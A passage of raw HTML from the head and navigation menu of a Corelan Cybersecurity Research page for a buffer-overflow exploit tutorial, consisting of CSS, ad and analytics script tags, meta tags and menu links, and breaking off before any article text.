CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8P3hwYWNrZXQgZW5kPSJ3Ij8+ZK4pUAAAACBjSFJNAAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAABIUlEQVR42qSTsUrEQBCG/8QjCCcWV1gJYm+31ic+gHa2goVcbeMb2PgGcoVgay3YiKDtpbBNpQgWV6i5Iptkx/ktcrcEj0OSG1j4Z4f9dmd2JiCJZayzKBDcblwBMFM35tF40AgApTnZPzYAcP140/wF+AGstV63ABBFUXjdHCBEnucgCcg/gGDYqxfMW1mWHhAMe6M/4Zinn4PO9DZzsHdorLUg6dfM7+/0TX0/DEM8vzzVUhDCOQfnHACArPx0kiLLMgCAEwdqdTiKIp/WDBDfP9zN5be5vWV0RfHx9h7PNwpiD+BZOtckweX6SFYFqgoIwfPJbrNfcIR0pSqia/ONhULXtAIU2gLwLWCXXjcHJJJ8XbxWeoxk4dAtO86/AwCZ86lQjmgAxAAAAABJRU5ErkJggg==)}.stb-container.stb-collapsed .stb-content {padding-bottom: 0;padding-top: 0}.stb-container.stb-no-caption, .stb-container.stb-no-caption.stb-ltr {direction: ltr}.stb-container.stb-no-caption:not(.stb-caption-box) .stb-content,.stb-container.stb-no-caption.stb-ltr:not(.stb-caption-box) .stb-content {padding: 10px 10px 10px 0}.stb-container.stb-no-caption.stb-rtl {direction: rtl}.stb-container.stb-no-caption.stb-rtl:not(.stb-caption-box) .stb-content {padding: 10px 0 10px 10px}
.stb-container.stb-style-alert {color: #000000;border: 1px solid #FF4F4A;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #fDCBC9), color-stop(90%, #FB7D78));background-image: -o-linear-gradient(top, #fDCBC9 30%, #FB7D78 90%);background-image: linear-gradient(180deg, #fDCBC9 30%, #FB7D78 90%);}.stb-container.stb-style-alert .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #1D1A1A), color-stop(90%, #504848));background-image: -o-linear-gradient(top, #1D1A1A 30%, #504848 90%);background-image: linear-gradient(180deg, #1D1A1A 30%, #504848 90%);}.stb-container.stb-style-alert.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #fDCBC9), color-stop(90%, #FB7D78));background-image: -o-linear-gradient(top, #fDCBC9 30%, #FB7D78 90%);background-image: linear-gradient(180deg, #fDCBC9 30%, #FB7D78 90%);}.stb-container.stb-style-black {color: #FFFFFF;border: 1px solid #6E6E6E;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #3B3B3B), color-stop(90%, #000000));background-image: -o-linear-gradient(top, #3B3B3B 30%, #000000 90%);background-image: linear-gradient(180deg, #3B3B3B 30%, #000000 90%);}.stb-container.stb-style-black .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #4B4747), color-stop(90%, #141414));background-image: -o-linear-gradient(top, #4B4747 30%, #141414 90%);background-image: linear-gradient(180deg, #4B4747 30%, #141414 90%);}.stb-container.stb-style-black.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #3B3B3B), color-stop(90%, #000000));background-image: -o-linear-gradient(top, #3B3B3B 30%, #000000 90%);background-image: linear-gradient(180deg, #3B3B3B 30%, #000000 90%);}.stb-container.stb-style-custom {color: #000000;border: 1px solid #F844EE;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #F7CDF5), color-stop(90%, #F77DF1));background-image: -o-linear-gradient(top, #F7CDF5 30%, #F77DF1 90%);background-image: linear-gradient(180deg, #F7CDF5 30%, #F77DF1 90%);}.stb-container.stb-style-custom .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #1D1A1A), color-stop(90%, #504848));background-image: -o-linear-gradient(top, #1D1A1A 30%, #504848 90%);background-image: linear-gradient(180deg, #1D1A1A 30%, #504848 90%);}.stb-container.stb-style-custom.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #F7CDF5), color-stop(90%, #F77DF1));background-image: -o-linear-gradient(top, #F7CDF5 30%, #F77DF1 90%);background-image: linear-gradient(180deg, #F7CDF5 30%, #F77DF1 90%);}.stb-container.stb-style-download {color: #000000;border: 1px solid #65ADFE;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #78C0F7), color-stop(90%, #2E7CB9));background-image: -o-linear-gradient(top, #78C0F7 30%, #2E7CB9 90%);background-image: linear-gradient(180deg, #78C0F7 30%, #2E7CB9 90%);}.stb-container.stb-style-download .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #1D1A1A), color-stop(90%, #504848));background-image: -o-linear-gradient(top, #1D1A1A 30%, #504848 90%);background-image: linear-gradient(180deg, #1D1A1A 30%, #504848 90%);}.stb-container.stb-style-download.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #78C0F7), color-stop(90%, #2E7CB9));background-image: -o-linear-gradient(top, #78C0F7 30%, #2E7CB9 90%);background-image: linear-gradient(180deg, #78C0F7 30%, #2E7CB9 90%);}.stb-container.stb-style-grey {color: #000000;border: 1px solid #BBBBBB;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #E3E3E3), color-stop(90%, #ABABAB));background-image: -o-linear-gradient(top, #E3E3E3 30%, #ABABAB 90%);background-image: linear-gradient(180deg, #E3E3E3 30%, #ABABAB 90%);}.stb-container.stb-style-grey .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #B5B5B5), color-stop(90%, #6E6E6E));background-image: -o-linear-gradient(top, #B5B5B5 30%, #6E6E6E 90%);background-image: linear-gradient(180deg, #B5B5B5 30%, #6E6E6E 90%);}.stb-container.stb-style-grey.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #E3E3E3), color-stop(90%, #ABABAB));background-image: -o-linear-gradient(top, #E3E3E3 30%, #ABABAB 90%);background-image: linear-gradient(180deg, #E3E3E3 30%, #ABABAB 90%);}.stb-container.stb-style-info {color: #000000;border: 1px solid #7AD975;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #A1EA94), color-stop(90%, #79B06E));background-image: -o-linear-gradient(top, #A1EA94 30%, #79B06E 90%);background-image: linear-gradient(180deg, #A1EA94 30%, #79B06E 90%);}.stb-container.stb-style-info .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #1D1A1A), color-stop(90%, #504848));background-image: -o-linear-gradient(top, #1D1A1A 30%, #504848 90%);background-image: linear-gradient(180deg, #1D1A1A 30%, #504848 90%);}.stb-container.stb-style-info.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #A1EA94), color-stop(90%, #79B06E));background-image: -o-linear-gradient(top, #A1EA94 30%, #79B06E 90%);background-image: linear-gradient(180deg, #A1EA94 30%, #79B06E 90%);}.stb-container.stb-style-warning {color: #000000;border: 1px solid #FE9A05;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #F8FC91), color-stop(90%, #F0D208));background-image: -o-linear-gradient(top, #F8FC91 30%, #F0D208 90%);background-image: linear-gradient(180deg, #F8FC91 30%, #F0D208 90%);}.stb-container.stb-style-warning .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #1D1A1A), color-stop(90%, #504848));background-image: -o-linear-gradient(top, #1D1A1A 30%, #504848 90%);background-image: linear-gradient(180deg, #1D1A1A 30%, #504848 90%);}.stb-container.stb-style-warning.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #F8FC91), color-stop(90%, #F0D208));background-image: -o-linear-gradient(top, #F8FC91 30%, #F0D208 90%);background-image: linear-gradient(180deg, #F8FC91 30%, #F0D208 90%);}
</style>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="https://www.corelan.be/index.php/wp-json/"><link rel="alternate" type="application/json" href="https://www.corelan.be/index.php/wp-json/wp/v2/posts/2146"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.corelan.be/xmlrpc.php?rsd">
<link rel="shortlink" href="https://www.corelan.be/?p=2146">
<link rel="alternate" type="application/json+oembed" href="https://www.corelan.be/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F07%2F23%2Fwriting-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2%2F">
<link rel="alternate" type="text/xml+oembed" href="https://www.corelan.be/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F07%2F23%2Fwriting-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2%2F&amp;format=xml">
<script async="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-8134501503628637",
          enable_page_level_ads: true
     });
</script>


<style type="text/css">
div.aka_half {
	float: left;
	overflow: auto;
	width: 45%;
}
div.aka_clear {
	clear: both;
	float: none;
}
</style>
		<meta name="generator" content="Site Kit by Google 1.128.1">	<style>img#wpstats{display:none}</style>
		
<script type="text/javascript">
/* <![CDATA[ */
var thickboxL10n = {"next":"Next &gt;","prev":"&lt; Prev","image":"Image","of":"of","close":"Close","loadingAnimation":"https:\/\/www.corelan.be\/wp-content\/plugins\/auto-thickbox\/images\/loadingAnimation.gif"};
try{convertEntities(thickboxL10n);}catch(e){};;
/* ]]> */
</script>
<link rel="shortcut icon" href="https://www.corelan.be/wp-content/themes/corelan/favicon.ico">
		
<!-- Google AdSense meta tags added by Site Kit -->
<meta name="google-adsense-platform-account" content="ca-host-pub-2644536267352236">
<meta name="google-adsense-platform-domain" content="sitekit.withgoogle.com">
<!-- End Google AdSense meta tags added by Site Kit -->
<style type="text/css">.broken_link, a.broken_link {
	text-decoration: line-through;
}</style>
<!-- Google AdSense snippet added by Site Kit -->
<script type="text/javascript" async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8134501503628637&amp;host=ca-host-pub-2644536267352236" crossorigin="anonymous" data-checked-head="true"></script>

<!-- End Google AdSense snippet added by Site Kit -->
<script type="text/javascript" src="https://www.corelan.be/wp-content/themes/corelan/script.js"></script>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-31176335-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

<!-- AdSense -->
<script async="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-8134501503628637",
    enable_page_level_ads: true
  });
</script>
<!-- End AdSense -->


<meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/ERL66fN363FkXxgDc6F1+ucRUkAhjEca9W3la6xaLnD2Y1lABsqmdaJmPNaUKPKVBRpyMKEhXYl7rSvrQw+AkAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A6OdGH3fVf4eKRDbXb4thXA4InNqDJDRhZ8U533U/roYjp4Yau0T3YSuc63vmAs/8ga1cD0E3A7LEq6AXk1uXgsAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/ERL66fN363FkXxgDc6F1+ucRUkAhjEca9W3la6xaLnD2Y1lABsqmdaJmPNaUKPKVBRpyMKEhXYl7rSvrQw+AkAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A6OdGH3fVf4eKRDbXb4thXA4InNqDJDRhZ8U533U/roYjp4Yau0T3YSuc63vmAs/8ga1cD0E3A7LEq6AXk1uXgsAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/ERL66fN363FkXxgDc6F1+ucRUkAhjEca9W3la6xaLnD2Y1lABsqmdaJmPNaUKPKVBRpyMKEhXYl7rSvrQw+AkAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A6OdGH3fVf4eKRDbXb4thXA4InNqDJDRhZ8U533U/roYjp4Yau0T3YSuc63vmAs/8ga1cD0E3A7LEq6AXk1uXgsAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/ERL66fN363FkXxgDc6F1+ucRUkAhjEca9W3la6xaLnD2Y1lABsqmdaJmPNaUKPKVBRpyMKEhXYl7rSvrQw+AkAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A6OdGH3fVf4eKRDbXb4thXA4InNqDJDRhZ8U533U/roYjp4Yau0T3YSuc63vmAs/8ga1cD0E3A7LEq6AXk1uXgsAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"></head>
<body class="post-template-default single single-post postid-2146 single-format-standard" aria-hidden="false">


<div id="art-main">
    <div class="art-header">
        <div class="art-header-center">
            <div class="art-header-png"></div>
        </div>
    <div class="art-header-wrapper">
    <div class="art-header-inner">
        <div class="art-headerobject"></div>
        <div class="art-logo">
                <h1 id="name-text" class="art-logo-name"><a href="https://www.corelan.be/" data-wpel-link="internal">Corelan Cybersecurity Research</a></h1>
                            <h2 id="slogan-text" class="art-logo-text">:: Knowledge is not an object, it's a flow ::</h2>
                </div>
    </div>
    </div>
    </div>
    <div class="art-sheet">
        <div class="art-sheet-tl"></div>
        <div class="art-sheet-tr"></div>
        <div class="art-sheet-bl"></div>
        <div class="art-sheet-br"></div>
        <div class="art-sheet-tc"></div>
        <div class="art-sheet-bc"></div>
        <div class="art-sheet-cl"></div>
        <div class="art-sheet-cr"></div>
        <div class="art-sheet-cc"></div>
        <div class="art-sheet-body">
            <div class="art-nav">
            	<div class="art-nav-l"></div>
            	<div class="art-nav-r"></div>
            	
<ul class="art-menu">
	<li><a href="https://www.corelan.be" title="Home" data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">Home</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/articles/" title="Articles" data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">Articles</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="/?cat=11" title="Free Tools" data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">Free Tools</span></a>
	<ul>
		<li><a href="/index.php/category/active-directory/" title="AD &amp; CS" data-wpel-link="internal">AD &amp; CS</a>
		<ul>
			<li><a href="/index.php/2007/11/18/free-tool-pve-active-directory-disable-users/" title="AD Disable Users" data-wpel-link="internal">AD Disable Users</a>
			</li>
			<li><a href="/index.php/2009/04/10/free-tool-windows-2008-certificate-authority-certificate-list-utility-for-pending-requests-and-about-to-expire-certificates/" title="Certificate List Utility" data-wpel-link="internal">Certificate List Utility</a>
			</li>
			<li><a href="https://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/" title="PVE Find AD User" data-wpel-link="internal">PVE Find AD User</a>
			</li>
		</ul>
		</li>
		<li><a href="/index.php/category/exchange/" title="Exchange Transport Agents" data-wpel-link="internal">Exchange Transport Agents</a>
		<ul>
			<li><a href="/index.php/2008/07/21/free-tool-attachment-filtering-with-exchange-2007-custom-transport-agent/" title="Attachment filter" data-wpel-link="internal">Attachment filter</a>
			</li>
			<li><a href="/index.php/2009/06/20/exchange-20072010-renaming-attachments-on-the-fly-custom-transport-agent/" title="Attachment rename" data-wpel-link="internal">Attachment rename</a>
			</li>
		</ul>
		</li>
		<li><a href="/index.php/category/networking/" title="Networking" data-wpel-link="internal">Networking</a>
		<ul>
			<li><a href="https://www.corelan.be/index.php/my-free-tools/networking/cisco-switch-backup-utility/" title="Cisco switch backup utility" data-wpel-link="internal">Cisco switch backup utility</a>
			</li>
			<li><a href="/index.php/2009/01/28/monitoring-your-network-with-powershell/" title="Network monitoring with powershell" data-wpel-link="internal">Network monitoring with powershell</a>
			</li>
			<li><a href="/index.php/2008/09/26/free-tool-pve-tcp-ping-utility/" title="TCP Ping" data-wpel-link="internal">TCP Ping</a>
			</li>
		</ul>
		</li>
		<li><a href="/index.php/category/security/" title="Security Related Tools" data-wpel-link="internal">Security Related Tools</a>
		</li>
	</ul>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/category/security/" title="Security" data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">Security</span></a>
	<ul>
